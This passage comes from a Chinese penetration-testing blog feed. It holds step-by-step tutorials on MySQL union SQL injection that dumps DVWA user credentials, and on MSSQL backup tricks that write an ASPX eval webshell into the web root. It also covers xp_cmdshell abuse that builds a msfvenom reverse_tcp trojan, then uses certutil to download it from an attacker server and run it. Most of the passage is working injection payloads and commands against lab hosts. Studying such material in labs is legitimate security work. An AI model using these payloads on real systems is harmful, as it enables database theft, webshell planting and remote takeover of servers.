id="3、联合查询"><a href="#3、联合查询" class="headerlink" title="3、联合查询"></a>3、联合查询</h3><h4 id="获取当前数据库和数据库用户名："><a href="#获取当前数据库和数据库用户名：" class="headerlink" title="获取当前数据库和数据库用户名："></a>获取当前数据库和数据库用户名：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line">1&#x27; union select database(),user() #</span><br><span class="line">带到数据库执行就是：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; union select database(),user() #&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line"> database()是一个mysql的函数，意思是查询当前数据库名</span><br><span class="line"> user() 意思是查询当前数据库的用户名</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1520.png" alt="图片"></p><p>查询出来发现当前数据库名是：<code>dvwa</code>，数据库用户名是 <code>root</code> ！</p><h4 id="获取当前的数据库版本和操作系统："><a href="#获取当前的数据库版本和操作系统：" class="headerlink" title="获取当前的数据库版本和操作系统："></a>获取当前的数据库版本和操作系统：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line">1&#x27; union select version(),@@version_compile_os #</span><br><span class="line">带到数据库执行就是：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; union select version(),@@version_compile_os #&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">version() 是一个函数，意思是查询当前数据库的版本信息</span><br><span class="line">@@version_compile_os 是一个函数，意思是查询操作系统信息</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1521.png" alt="图片"></p><p>有上图可见，我们的<code>MySQL</code>数据库版本为：<code>5.5.53</code>，而我们的操作系统信息是<code>win32</code>，说明是<code>windows</code>操作系统！</p><p>为什么要获取MySQL的版本？</p><p>因为当MySQL的版本<code>⼩于4.0</code>时，是不⽀持<code>union select</code>联合查询的；当MySQL版本<code>⼤于 5.0</code>时，有个默认数据库<code>information_schema</code>，保存了 Mysql服务器所有数据库的信息,如数据库名，数据库的表， 表栏的数据类型与访问权限等。该数据库拥有⼀个名为 <code>tables</code> 的数据表，该表包含两个字段 <code>table_name</code> 和 <code>table_schema</code>，分别记录 <code>DBMS</code> 中的存储的表名和表名所在的数据库。</p><h3 id="4、获取表名"><a href="#4、获取表名" class="headerlink" title="4、获取表名"></a>4、获取表名</h3><p>因为我们查询出来了<code>MySQL</code>的版本是<code>大于5.0</code>的，那么我们就可以利用联合查询 <code>union select</code> 来对他的数据库下的表名进行查询！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line">1&#x27; union select table_name,table_schema from information_schema.tables where table_schema= &#x27;dvwa&#x27;#</span><br><span class="line">带入数据库查询执行就是：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; union select table_name,table_schema from information_schema.tables where table_schema= &#x27;dvwa&#x27;#&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">information_schema.tablesinformation_schema下的tables的数据表包含了两个字段：tables_name、tables_schema,分别记录dbms中的存储的表名所在的数据库</span><br><span class="line"> where table_schema= &#x27;dvwa&#x27;  这里使用了where条件语句指定了查询的数据库名为：dvwa</span><br><span class="line"> 总的语句的意思就是，查询dvwa这个数据库名下的所有表名</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1522.png" alt="图片"></p><p>由上图可见，我们查询出来 <code>dvwa</code> 数据库下有两个表：<code>guestbook</code>、<code>users</code> 两张表！很显然我们的敏感信息就在 <code>users</code> 这张表里！</p><h3 id="5、获取表中的列名"><a href="#5、获取表中的列名" class="headerlink" title="5、获取表中的列名"></a>5、获取表中的列名</h3><p>我们得到的信息有，数据库名：<code>dvwa</code>，表名：<code>users</code>，接下来就查表<code>users</code>下的列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line"> 1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br><span class="line">带入数据库查询执行就是：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27; 1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">group_concat(column_name)group_concat()这个函数是吧所有的信息一次性列举出来，返回一个字符串结果！而他里面的column_name就是我们所有列名</span><br><span class="line">information_schema.columns这个表里存放的是我们数据库中所有的列名信息</span><br><span class="line">where table_name=&#x27;users&#x27;使用where条件来指定我们要获取users表下的列</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1523.png" alt="图片"></p><p>由上图可见，我们得到了所有的列名：<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>user</code>,<code>password</code>,<code>avatar</code>,<code>last_login</code>,<code>failed_login</code></p><p>其中铭感的列名就是 <code>user</code>、<code>password</code>，我们就查询他们两个列名下的数据！</p><h3 id="6、获取数据"><a href="#6、获取数据" class="headerlink" title="6、获取数据"></a>6、获取数据</h3><p>到了最后一步，我们得到的信息有：数据库名：<code>dvwa</code>、表名：<code>users</code>、列名：<code>user</code>、<code>passoword</code></p><p>这个时候我们就可以来使用联合查询 <code>union select</code> 来查询 <code>user</code> 、 <code>password</code> 列里的数据了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line">1&#x27; union select user,password from users#</span><br><span class="line">带入数据库查询执行就是：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; union select user,password from users#&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">union select将多个select的语句的结果合并到一个结果集中里！因为我们注入语句前面就已经是一个查询语句了：SELECT first_name, last_name FROM users WHERE user_id =，而我们使用 union select 就可以吧前面和后面的SQL语句合并为一个SQL语句来进行查询！</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1524.png" alt="图片"></p><p>由上图可见，我们获取到了他们的账号和加密的密码！至此MySQL手工注入之联合查询就到此为止！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Microsoft SQL Server手注之db_owner权限处理</title>
      <link href="/2020/03/23/SQL-MsSQL-6/"/>
      <url>/2020/03/23/SQL-MsSQL-6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>注入点：<code>http://192.168.159.137/post.aspx</code></p><p>首先我配置了一下权限：（添加了一个新用户 <code>saul</code>，映射了 <code>test</code> 数据库，只有 <code>db_owner</code>，<code>public</code>权限）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1497.png" alt="图片"></p><p>加了一个单引号报错得到网站绝对路径：<code>c:\inetpub\wwwroot\post.aspx</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1498.png" alt="图片"></p><h2 id="Log备份Getshell"><a href="#Log备份Getshell" class="headerlink" title="Log备份Getshell"></a>Log备份Getshell</h2><p><code>LOG备份</code>的要求是他的<code>数据库备份过</code>，而且选择恢复模式<code>得是完整模式</code>，至少在<code>2008</code>上是这样的，但是使用log备份<code>文件会小的多</code>，当然如果你的权限够高可以设置他的恢复模式。</p><p>具体如何备份<code>Mssql</code>数据库参考这篇文章：<a href="https://www.cnblogs.com/huangtaiyu/p/5560980.html">https://www.cnblogs.com/huangtaiyu/p/5560980.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;alter database test set RECOVERY FULL--</span><br><span class="line">;create table cmd (a image)--</span><br><span class="line">;backup log test to disk = &#x27;c:/1.bak&#x27; with init--</span><br><span class="line">;insert into cmd (a) values (&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;saul&quot;],&quot;unsafe&quot;);%&gt;&#x27;)--</span><br><span class="line">;backup log test to disk = &#x27;c:\inetpub\wwwroot\saul.aspx&#x27;--</span><br><span class="line">;drop table cmd--</span><br></pre></td></tr></table></figure><h3 id="1、修改数据库恢复为完整模式"><a href="#1、修改数据库恢复为完整模式" class="headerlink" title="1、修改数据库恢复为完整模式"></a>1、修改数据库恢复为完整模式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;alter database test set RECOVERY FULL --</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1499.png" alt="图片"></p><h3 id="2、创建一张表：cmd，只有一个-a-列，类型为-image"><a href="#2、创建一张表：cmd，只有一个-a-列，类型为-image" class="headerlink" title="2、创建一张表：cmd，只有一个 a 列，类型为 image"></a>2、创建一张表：cmd，只有一个 a 列，类型为 image</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin &#x27;;create table cmd (a image) --</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1500.png" alt="图片"></p><h3 id="3、备份表到C-1-bak"><a href="#3、备份表到C-1-bak" class="headerlink" title="3、备份表到C:\1.bak"></a>3、备份表到C:\1.bak</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;backup log test to disk = &#x27;c:/1.bak&#x27; with init --</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1501.png" alt="图片"></p><h3 id="4、插入一句话木马到-cmd-表里"><a href="#4、插入一句话木马到-cmd-表里" class="headerlink" title="4、插入一句话木马到 cmd 表里"></a>4、插入一句话木马到 cmd 表里</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;;insert into cmd (a) values (&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;saul&quot;],&quot;unsafe&quot;);%&gt;&#x27;)--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1502.png" alt="图片"></p><h3 id="5、吧操作日志备份到网站根目录"><a href="#5、吧操作日志备份到网站根目录" class="headerlink" title="5、吧操作日志备份到网站根目录"></a>5、吧操作日志备份到网站根目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin &#x27;;backup log test to disk = &#x27;c:\inetpub\wwwroot\saul.aspx&#x27; --</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1503.png" alt="图片"></p><p>这个时候我们就得到了一个<code>webshell</code>：<a href="http://192.168.159.137/saul.aspx">http://192.168.159.137/saul.aspx</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1504.png" alt="图片"></p><p>写入成功记得擦屁股吧创建的表删了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;;drop table cmd--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1505.png" alt="图片"></p><p>最后用蚁剑连接：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1506.png" alt="图片"></p><p>成功 <code>Getshell</code>！</p><h2 id="差异备份Getshell（不推荐）"><a href="#差异备份Getshell（不推荐）" class="headerlink" title="差异备份Getshell（不推荐）"></a>差异备份Getshell（不推荐）</h2><p><code>差异备份</code>数据库得到webshell。在<code>sql server</code> 里<code>dbo</code>和<code>sa</code>权限都有备份数据库权限，我们可以把数据库备份成<code>aspx</code>文件，这样我们就可以通过<code>mssqlserver</code>的备份数据库功能生成一个网页小马。</p><p>PS：差异备份有几率会导致网站挂掉！如果上面的<code>LOG备份</code>拿shell成功的话就尽量别用差异备份拿shell这种方法！具体为啥我也不知道。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. backup database 库名 to disk = &#x27;c:\bak.bak&#x27;;--</span><br><span class="line"></span><br><span class="line">2. create table [dbo].[test] ([cmd] [image]);--</span><br><span class="line"></span><br><span class="line">3. insert into test(cmd) values(&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;saul&quot;],&quot;unsafe&quot;);%&gt;&#x27;)--</span><br><span class="line"></span><br><span class="line">4. backup database 库名 to disk=&#x27;C:\d.asp&#x27; WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure><h3 id="1、备份数据库"><a href="#1、备份数据库" class="headerlink" title="1、备份数据库"></a>1、备份数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;;backup database test to disk = &#x27;c:\bak.bak&#x27;;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1507.png" alt="图片"></p><h3 id="2、创建一张表"><a href="#2、创建一张表" class="headerlink" title="2、创建一张表"></a>2、创建一张表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;;create table [dbo].[test] ([cmd] [image]);--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1508.png" alt="图片"></p><h3 id="3、写入webshell到表"><a href="#3、写入webshell到表" class="headerlink" title="3、写入webshell到表"></a>3、写入webshell到表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;;insert into test(cmd) values(&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;saul&quot;],&quot;unsafe&quot;);%&gt;&#x27;)--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1509.png" alt="图片"></p><h3 id="4、创建脚本文件"><a href="#4、创建脚本文件" class="headerlink" title="4、创建脚本文件"></a>4、创建脚本文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;;backup database test to disk=&#x27;c:\inetpub\wwwroot\saul1.aspx&#x27; WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1510.png" alt="图片"></p><p>这个时候就得到了<code>webshell</code>：<a href="http://192.168.159.137/saul1.aspx">http://192.168.159.137/saul1.aspx</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1511.png" alt="图片"></p><p>由上图可见发现是<code>503</code>，我们上帝视角看看：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1512.png" alt="图片"></p><p>确实是写入成功的！就是内存有点大！是因为我们访问的日志过多导致的！我们重启一下服务器。。。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1513.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1514.png" alt="图片"></p><p>成功<code>Getshell</code>！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MsSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Microsoft SQL Server手注之Sa权限多种处理姿势</title>
      <link href="/2020/03/23/SQL-MsSQL-5/"/>
      <url>/2020/03/23/SQL-MsSQL-5/</url>
      
        <content type="html"><![CDATA[<h2 id="MSSQL注入探测"><a href="#MSSQL注入探测" class="headerlink" title="MSSQL注入探测"></a>MSSQL注入探测</h2><h3 id="MSSQL权限划分"><a href="#MSSQL权限划分" class="headerlink" title="MSSQL权限划分"></a>MSSQL权限划分</h3><p>三个权限：<code>sysadmin</code>、<code>db_owner</code>、<code>public</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sysadmin：可以执行所有操作</span><br><span class="line">db_owner：可以执行数据库操作</span><br><span class="line">public：只能执行查询操作</span><br></pre></td></tr></table></figure><h3 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h3><p>注入点：<a href="http://192.168.159.135:8080/post.aspx">http://192.168.159.135:8080/post.aspx</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1470.png" alt="图片"></p><p>加了一个单引号报错：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1471.png" alt="图片"></p><p>存在注入，而且网站路径为： <code>c:\Inetpub\mssql-sql\post.aspx</code></p><h3 id="判断是否是MSSQL"><a href="#判断是否是MSSQL" class="headerlink" title="判断是否是MSSQL"></a>判断是否是MSSQL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and exists (select * from sysobjects)  and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1472.png" alt="图片"></p><h3 id="判断MSSQL版本"><a href="#判断MSSQL版本" class="headerlink" title="判断MSSQL版本"></a>判断MSSQL版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and 1=(select @@VERSION)  and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1473.png" alt="图片"></p><h3 id="判断当前数据库名"><a href="#判断当前数据库名" class="headerlink" title="判断当前数据库名"></a>判断当前数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; And 1=(select db_name())  and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1474.png" alt="图片"></p><h3 id="判断是否是系统管理员权限sa"><a href="#判断是否是系统管理员权限sa" class="headerlink" title="判断是否是系统管理员权限sa"></a>判断是否是系统管理员权限sa</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and 1=(select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;))  and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1475.png" alt="图片"></p><h2 id="xp-cmdshell执行命令"><a href="#xp-cmdshell执行命令" class="headerlink" title="xp_cmdshell执行命令"></a>xp_cmdshell执行命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;ipconfig&quot; --</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1476.png" alt="图片"></p><p>虽然系统执行了，但是系统没回显给我们！这是为什么呢？</p><p>是因为我们只能执行命令后吧结果保存到一张表里，然后我们通过<code>sql</code>语句来查询这条表才能看到执行的命令结果！</p><p>我们在<code>MSSQL</code>客户端是可以执行回显的：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1477.png" alt="图片"></p><h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><p>低权限也可以写webshell，只要是<code>写权限</code>就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有回显：有回显那么我们直接就可以找到webshell的路径</span><br><span class="line">无回显：无回显就只能瞎鸡巴乱懵，看网站存放文件的规则然后Fuzz</span><br></pre></td></tr></table></figure><p>因为我们是一个<code>sa</code>的高权限了，我们就可以让它执行一些其他命令来<code>反弹shell</code>或者说是写一个<code>webshell</code>到网站服务器里！</p><p>之前我们得到网站的绝对路径是 <code>c:\Inetpub\mssql-sql\post.aspx</code> ，下面这条语句就可以写文件进去了，我们先随便写一段话进去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;echo saulGoodman&gt;c:\Inetpub\mssql-sql\1.txt&quot; --</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1478.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1479.png" alt="图片"></p><p>上帝视角看看：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1480.png" alt="图片"></p><p>由上图可见，我们成功写入 <code>saulGoodman</code> 内容到了<code>1.txt</code>里！</p><h2 id="小技巧-如何判断它是能执行命令的呢？"><a href="#小技巧-如何判断它是能执行命令的呢？" class="headerlink" title="小技巧:如何判断它是能执行命令的呢？"></a>小技巧:如何判断它是能执行命令的呢？</h2><p>我们可以执行这条命令让他去<code>ping</code> 网站<code>10</code>次：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;ping -n 10 www.saulgoodman.cn&quot; --</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1481.png" alt="图片"></p><p><code>ping -n 10 www.saulgoodman.cn</code> ，这条命令的意思是使用<code>ping</code>命令去像<code>www.saulgoodman.cn</code>去发送<code>10条数据包</code>！如果网站<code>延迟了10秒</code>左右说明我们的命令是可以执行的！</p><p>如果没有执行的话，说明它没有开启<code>xp_cmdshell</code>，那么我们可以使用下面的语句去开启他：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;</span><br><span class="line">关闭的话就吧1修改为0</span><br></pre></td></tr></table></figure><h2 id="写一句话"><a href="#写一句话" class="headerlink" title="写一句话"></a>写一句话</h2><p><code>aspx</code> 一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% @Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;saul&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><p>写入语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &#x27;echo ^&lt;^%^@Page Language=^&quot;^Jscript^&quot;^%^&gt;^&lt;^%^eval(Request.Item^[^&quot;saul^&quot;^]^,^&quot;unsafe^&quot;)^;^%^&gt;&gt;c:\Inetpub\mssql-sql\1.aspx&#x27;--</span><br><span class="line">注意！如果echo 里面的字符有引号和其他符号，那么我们就要在引号前面加一个 ^ 来转义它！记得用单引号包裹里面的一句话！</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1482.png" alt="图片"></p><p>上帝视角看看：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1483.png" alt="图片"></p><p>由上图可见，我们成功写入到了网站根目录！</p><p>蚁剑连接成功：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1484.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1485.png" alt="图片"></p><p>这样我们就通过注入点来拿到了一个Webshell！</p><h2 id="下载执行反向远程控制服务端（木马）"><a href="#下载执行反向远程控制服务端（木马）" class="headerlink" title="下载执行反向远程控制服务端（木马）"></a>下载执行反向远程控制服务端（木马）</h2><p>首先要让对方下载我们的恶意文件，那么我们需要有一个<code>服务端</code>，用<code>python</code>开启一个服务端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 9000</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1486.png" alt="图片"></p><p>有了服务端，然后我们在<code>KALI</code>上生成一个反向木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.159.128 lport=8888 -f exe &gt;8888.exe</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1487.png" alt="图片"></p><p>这个时候我们的木马地址就是：<code>http://192.168.159.128:9000/8888.exe</code></p><p>最后<code>MSF</code>开启监听等待肉鸡上线：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1488.png" alt="图片"></p><p>准备工作完成后，我们就可以在注入点上去执行这条命令：（只能2008以上，2003测试失败）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原命令：</span><br><span class="line">certutil -urlcache -split -f http://192.168.159.128:9000/8888.exe 8888.exe</span><br><span class="line">加上注入语句：</span><br><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;certutil -urlcache -split -f http://192.168.159.128:9000/8888.exe 8888.exe&quot; --</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1489.png" alt="图片"></p><p>然后我们执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;8888.exe&quot; --</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1490.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1491.png" alt="图片"></p><p>或者还可以一条命令完成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;certutil -urlcache -split -f http://192.168.159.128:9000/8888.exe 8888.exe &amp;&amp;8888.exe&quot; --</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1492.png" 